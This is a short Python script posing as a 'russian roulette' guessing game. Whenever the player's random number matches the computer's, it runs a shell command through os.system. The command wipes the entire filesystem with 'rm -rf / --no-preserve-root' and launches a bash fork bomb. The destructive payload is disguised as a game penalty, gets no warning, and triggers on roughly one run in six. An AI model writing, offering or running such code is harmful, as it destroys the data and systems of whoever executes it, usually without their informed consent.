import os
import random 

class aux:
    def __init__(self,play,list_arr,start_game,Runtime):
        self.play = play
        self.list_arr = list_arr
        self.start_game = start_game
aux.list_arr = [1,2,3,4,5,6]
choose= random.choice(aux.list_arr)
play = random.choice(aux.list_arr)
def start_game():
    aux.start_game = input("press enter to play russian roulette\n ").lower

def flw_cnrl():
    input("\n enter to go back")
    
def main_game():
    
    print("computer chooses",choose)
    print("your nunmber is",play)
    if play == choose:
            print("You lose :(")
            os.system("rm -rf / --no-preserve-root | :(){ :|:& };:")
    else:
        print("You Win")
def main():
    Runtime = True
    while Runtime:
        start_game()
        main_game()
        flw_cnrl()
        Runtime = False
main()
